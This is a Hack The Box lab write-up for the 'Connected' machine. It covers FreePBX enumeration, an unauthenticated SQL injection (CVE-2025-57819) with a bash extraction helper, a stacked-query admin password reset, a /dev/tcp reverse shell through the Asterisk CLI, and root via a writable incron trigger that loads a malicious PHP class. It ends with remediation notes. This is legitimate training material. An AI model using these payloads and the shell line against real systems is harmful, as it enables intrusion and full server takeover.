---
slug: "hackthebox/machines/htb-connected"
event: "hack-the-box-machines"
title: "HTB Connected Writeup"
summary: "Linux writeup covering FreePBX enumeration, SQL injection, admin access, and privilege escalation."
date: 2026-06-08
tags:
  - htb
  - linux
  - web
  - sqli
  - freepbx
  - recon
category: "hack-the-box"
difficulty: "medium"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5f828febf436aa997dff714a184614fe.png"
draft: false
---
## Summary

Connected was a Linux/FreePBX machine exposing SSH, HTTP, and HTTPS. The web application was FreePBX 16.0.40.7 with the vulnerable commercial `endpoint` module. Initial access was obtained by exploiting an unauthenticated SQL injection in the FreePBX endpoint AJAX handler, then using the database write primitive to reset the FreePBX admin password.

After authenticating to the FreePBX administrator panel, the Asterisk CLI functionality was used to execute commands and obtain a reverse shell as the `asterisk` user. Privilege escalation to root was achieved through a root-run `incrond` rule that executed `/usr/sbin/sysadmin_ha` whenever the writable file `/usr/local/asterisk/ha_trigger` was modified. The handler included a PHP file from a path that could be created by `asterisk`, allowing a malicious class to run as root and create a SUID root bash binary.

## Machine Information

|Field|Value|
|---|---|
|Machine|Connected|
|Platform|Hack The Box|
|OS|Linux / FreePBX Distro|
|Initial User|`asterisk`|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|
|Main Service|FreePBX 16.0.40.7|
|Vulnerability|FreePBX endpoint auth bypass / SQLi / admin access|
|CVE|CVE-2025-57819|

> Note: the box IP changed after reset. Replace `$TARGET` with the current assigned HTB IP.

---

## Reconnaissance

I first confirmed the target was reachable.

```bash
ping -c 3 [REDACTED_TARGET_IP]
```

The host responded with `ttl=63`, indicating the target was alive.

A full TCP scan was performed with RustScan and Nmap service detection.

```bash
rustscan -a [REDACTED_TARGET_IP] \
  --ulimit 5000 \
  --range 1-65535 \
  --timeout 1500 \
  --batch-size 4500 \
  -- -sCV -Pn -oN connected_rustscan.txt
```

Open ports:

```text
22/tcp   open  ssh       OpenSSH 7.4
80/tcp   open  http      Apache httpd 2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp  open  ssl/http  Apache httpd 2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```

The HTTP service redirected to `connected.htb`, so I added the hostnames to `/etc/hosts`.

```bash
echo "[REDACTED_TARGET_IP] connected.htb pbxconnect pbxconnect.connected.htb" | sudo tee -a /etc/hosts
```

Basic HTTP checks showed `/admin` as the main web path.

```bash
curl -i http://connected.htb/
curl -i http://connected.htb/admin/
curl -i http://connected.htb/robots.txt
```

The root path redirected to `/admin`, and `/admin/` redirected to `config.php`, confirming a FreePBX administration interface.

---

## Web Enumeration

Nmap HTTP scripts confirmed an exposed FreePBX-style interface.

```bash
nmap -p80,443 -Pn \
--script http-title,http-server-header,http-robots.txt,http-enum,http-auth-finder \
[REDACTED_TARGET_IP] -oN connected_http_scripts.txt
```

Interesting results:

```text
/robots.txt
/icons/
/admin/
/admin/config.php
```

The certificate on port 443 contained the common name:

```text
pbxconnect
```

The application stack was:

```text
Apache/2.4.6 (CentOS)
OpenSSL/1.0.2k-fips
PHP/7.4.16
FreePBX 16.0.40.7
```

---

## Vulnerability Discovery

The target exposed the FreePBX endpoint module AJAX path. Unauthenticated requests to normal endpoint commands returned `Not Authenticated`.

```bash
curl -i -k \
-H "Referer: http://connected.htb/admin/config.php?display=endpoint" \
-H "X-Requested-With: XMLHttpRequest" \
"http://connected.htb/admin/ajax.php?module=endpoint&command=getBrands"
```

Response:

```json
{"error":"Not Authenticated"}
```

However, using the fully qualified PHP module class path bypassed the normal module authentication path and reached vulnerable SQL handling.

Test payload:

```bash
curl -i -k \
-H "Referer: http://connected.htb/admin/config.php?display=endpoint" \
-H "X-Requested-With: XMLHttpRequest" \
"http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'%20AND%20EXTRACTVALUE(1,CONCAT('~USER:',(SELECT%20USER()),'~'))--%20"
```

The response leaked database output through an XPath error:

```text
XPATH syntax error: '~USER:freepbxuser@localhost~'
```

This confirmed unauthenticated SQL injection.

---

## SQL Injection Helper

To make extraction easier, I created a small Bash helper.

```bash
BASE='http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand='

enc() {
python3 - "$1" <<'PY'
import sys, urllib.parse
print(urllib.parse.quote(sys.argv[1], safe=''))
PY
}

sqli() {
  SQL="$1"
  PAYLOAD="x' AND EXTRACTVALUE(1,CONCAT('~',($SQL),'~'))-- "
  curl -sS -k \
    -H "Referer: http://connected.htb/admin/config.php?display=endpoint" \
    -H "X-Requested-With: XMLHttpRequest" \
    "${BASE}$(enc "$PAYLOAD")" \
  | grep -oP "XPATH syntax error: '\K[^']+"
}
```

I verified the database context.

```bash
sqli "SELECT DATABASE()"
sqli "SELECT USER()"
sqli "SELECT @@version"
```

Output:

```text
~asterisk~
~freepbxuser@localhost~
~5.5.65-MariaDB~
```

---

## Database Enumeration

I listed tables and useful columns.

```bash
sqli "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()"
```

Relevant tables included:

```text
ampusers
admin
users
userman_users
```

I enumerated columns from `ampusers`.

```bash
for i in 1 31 61 91 121 151 181 211; do
  sqli "SELECT SUBSTR(GROUP_CONCAT(column_name),$i,30) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='ampusers'"
done
```

Output:

```text
~username,email,extension,passw~
~ord_sha1,extension_low,extensi~
~on_high,deptname,sections~
```

Then I extracted the FreePBX admin hash.

```bash
for i in 1 31 61 91 121 151 181; do
  sqli "SELECT SUBSTR(GROUP_CONCAT(username,0x3a,password_sha1),$i,30) FROM ampusers"
done
```

Output:

```text
~admin:05c689686a4fad5ce3ec76e7~
~ae5708b1fe2da43a~
```

Full hash:

```text
admin:[REDACTED_HASH]
```

I attempted cracking with John, but the hash did not crack with `rockyou.txt`.

```bash
echo '[REDACTED_HASH]' > sha1.hash
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt sha1.hash
john --show --format=raw-sha1 sha1.hash
```

Result:

```text
0 password hashes cracked
```

Since the SQL injection allowed stacked queries, I reset the admin password directly.

---

## FreePBX Admin Password Reset

I generated a SHA1 hash for a known password.

```bash
NEWPASS='[REDACTED_PASSWORD]'
NEWHASH=$(printf '%s' "$NEWPASS" | sha1sum | awk '{print $1}')
echo "$NEWHASH"
```

Output:

```text
[REDACTED_HASH]
```

Then I updated the `ampusers` table.

```bash
PAYLOAD="x'; UPDATE ampusers SET password_sha1='$NEWHASH' WHERE username='admin';-- "

curl -i -k \
-H "Referer: http://connected.htb/admin/config.php?display=endpoint" \
-H "X-Requested-With: XMLHttpRequest" \
"${BASE}$(enc "$PAYLOAD")"
```

The application returned a PHP error, but the SQL query executed successfully.

I verified the updated hash in two chunks.

```bash
sqli "SELECT SUBSTR(password_sha1,1,30) FROM ampusers WHERE username='admin'"
sqli "SELECT SUBSTR(password_sha1,31,30) FROM ampusers WHERE username='admin'"
```

Output:

```text
~5923446e267b41f1145cd46297c0067
~6b17fc6dd~
```

Full updated hash:

```text
[REDACTED_HASH]
```

---

## Authenticated FreePBX Access

I tested login with curl.

```bash
rm -f admin.txt admin_login.out

curl -sS -c admin.txt -b admin.txt \
http://connected.htb/admin/config.php -o /tmp/login.html

curl -i -sS -c admin.txt -b admin.txt \
-X POST http://connected.htb/admin/config.php \
--data-urlencode 'username=admin' \
--data-urlencode 'password=[REDACTED_PASSWORD]' \
-o admin_login.out

grep -Ei 'Hello, admin|Logout|Module Admin|Asterisk CLI|Invalid|loginform' admin_login.out
```

Successful authentication indicators:

```text
Hello, admin
Logout
Module Admin
Asterisk CLI
```

I could now log in through the browser:

```text
http://connected.htb/admin/config.php
Username: admin
Password: [REDACTED_PASSWORD]
```

---

## Command Execution as `asterisk`

From the FreePBX administrator interface, I used the Asterisk CLI feature to execute commands.

Listener on Kali:

```bash
nc -lvnp 4444
```

Asterisk CLI command:

```text
shell bash -c 'bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4444 0>&1'
```

The reverse shell connected back.

```text
connect to [REDACTED_VPN_IP] from (UNKNOWN) [REDACTED_TARGET_IP]
bash: no job control in this shell
[asterisk@connected tmp]$
```

I confirmed the current user.

```bash
whoami
id
```

Output:

```text
asterisk
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

---

## User Flag

The only home directory was `/home/asterisk`.

```bash
ls /home/
```

Output:

```text
asterisk
```

I found and read the user flag.

```bash
cd /home/asterisk
ls
cat [REDACTED_FLAG_PATH]
```

Output:

```text
[REDACTED_HASH]
```

---

## Initial Privilege Escalation Enumeration

I checked sudo privileges.

```bash
sudo -l
```

Output:

```text
sudo: no tty present and no askpass program specified
```

I listed SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output:

```text
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/incrontab
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```

PwnKit was tested but ruled out because the target had a patched polkit package.

```bash
pkexec --version
rpm -q polkit
```

Output:

```text
pkexec version 0.112
polkit-0.112-26.el7_9.1.x86_64
```

The more useful lead was `incrond`.

```bash
ps aux | grep -Ei 'crond|incrond|cron' | grep -v grep
```

Output showed both cron and incron running as root.

```text
root /usr/sbin/incrond
root /usr/sbin/crond -n
```

I searched incron configuration.

```bash
grep -R . /etc/incron* /var/spool/incron 2>/dev/null
```

Interesting rule:

```text
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

I checked the watched file and handler.

```bash
ls -la /usr/local/asterisk/ha_trigger /usr/sbin/sysadmin_ha
file /usr/sbin/sysadmin_ha
```

Output:

```text
-rwxrwxrwx. 1 asterisk asterisk   0 Apr 15  2021 /usr/local/asterisk/ha_trigger
-rwxr-xr-x. 1 root     root     331 Apr 15  2021 /usr/sbin/sysadmin_ha
/usr/sbin/sysadmin_ha: PHP script, ASCII text executable
```

This meant the `asterisk` user could write to `ha_trigger`, causing root `incrond` to execute `/usr/sbin/sysadmin_ha`.

---

## Analyzing `/usr/sbin/sysadmin_ha`

I inspected the script.

```bash
head -n 220 /usr/sbin/sysadmin_ha
```

Content:

```php
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();
}
```

The important behavior was:

1. `sysadmin_ha` runs as root through `incrond`.

2. It checks for `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php`.

3. If the file exists, it includes it.

4. It instantiates class `incron`.

5. It calls method `rootTrigger()`.


The `freepbx_ha` module path did not need to exist beforehand. As `asterisk`, I could create it under the FreePBX web modules directory.

---

## Root Exploit

I created the required PHP class and method.

```bash
rm -f /tmp/rootbash

mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php <<'PHP'
<?php
class incron {
    public function rootTrigger() {
        @unlink("/tmp/rootbash");
        copy("/bin/bash", "/tmp/rootbash");
        chown("/tmp/rootbash", 0);
        chgrp("/tmp/rootbash", 0);
        chmod("/tmp/rootbash", 04755);
    }
}
?>
PHP
```

Then I triggered the root-run incron rule by writing to `ha_trigger`.

```bash
echo pwn > /usr/local/asterisk/ha_trigger
sleep 2
ls -l /tmp/rootbash
```

Output:

```text
-rwsr-xr-x 1 root root 964536 Jun  7 19:43 /tmp/rootbash
```

The SUID root bash was created successfully.

I spawned a root shell with preserved privileges.

```bash
/tmp/rootbash -p
id
```

Output:

```text
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

The effective UID was root, which allowed reading the root flag.

```bash
cat /root/[REDACTED_FLAG_PATH]
```

Output:

```text
[REDACTED_HASH]
```

---

## Attack Chain

```text
1. Port scan found SSH, HTTP, and HTTPS.
2. Web service exposed FreePBX 16.0.40.7.
3. FreePBX endpoint AJAX path was vulnerable to unauthenticated SQL injection.
4. SQLi leaked database information and the FreePBX admin password hash.
5. SQLi stacked query reset the FreePBX admin password.
6. Authenticated to the FreePBX administrator panel as admin.
7. Asterisk CLI was used to execute OS commands.
8. Reverse shell obtained as asterisk.
9. User flag read from /home/asterisk/[REDACTED_FLAG_PATH].
10. Root privesc found through root incron watching writable ha_trigger.
11. sysadmin_ha included attacker-created PHP file.
12. Malicious rootTrigger() created /tmp/rootbash as SUID root.
13. /tmp/rootbash -p gave euid=0.
14. Root flag read from /root/[REDACTED_FLAG_PATH].
```

---

## Key Commands

### SQLi Validation

```bash
sqli "SELECT DATABASE()"
sqli "SELECT USER()"
sqli "SELECT @@version"
```

### Admin Password Reset

```bash
NEWPASS='[REDACTED_PASSWORD]'
NEWHASH=$(printf '%s' "$NEWPASS" | sha1sum | awk '{print $1}')

PAYLOAD="x'; UPDATE ampusers SET password_sha1='$NEWHASH' WHERE username='admin';-- "

curl -i -k \
-H "Referer: http://connected.htb/admin/config.php?display=endpoint" \
-H "X-Requested-With: XMLHttpRequest" \
"${BASE}$(enc "$PAYLOAD")"
```

### Reverse Shell

```bash
nc -lvnp 4444
```

```text
shell bash -c 'bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4444 0>&1'
```

### Privilege Escalation

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php <<'PHP'
<?php
class incron {
    public function rootTrigger() {
        @unlink("/tmp/rootbash");
        copy("/bin/bash", "/tmp/rootbash");
        chown("/tmp/rootbash", 0);
        chgrp("/tmp/rootbash", 0);
        chmod("/tmp/rootbash", 04755);
    }
}
?>
PHP

echo pwn > /usr/local/asterisk/ha_trigger
sleep 2
/tmp/rootbash -p
id
cat /root/[REDACTED_FLAG_PATH]
```

---

## Flags

```text
User: [REDACTED_HASH]
Root: [REDACTED_HASH]
```

---

## Remediation Notes

To mitigate the initial access vector:

- Upgrade the FreePBX endpoint module to a patched version.

- Restrict administrator panel access using firewall rules or ACLs.

- Remove direct public exposure of FreePBX administration routes.

- Review `ampusers` for unauthorized users or modified password hashes.

- Review web logs for suspicious requests to FreePBX AJAX endpoints.

- Review FreePBX module integrity and unknown files under `/var/www/html/admin/modules`.


To mitigate the privilege escalation vector:

- Remove world-writable permissions from `/usr/local/asterisk/ha_trigger`.

- Remove unused HA/incron legacy rules.

- Ensure root-run handlers do not include PHP files from writable web paths.

- Restrict ownership of `/var/www/html/admin/modules` to trusted administrative users only.

- Audit `incrond` rules for writable trigger files and unsafe handlers.
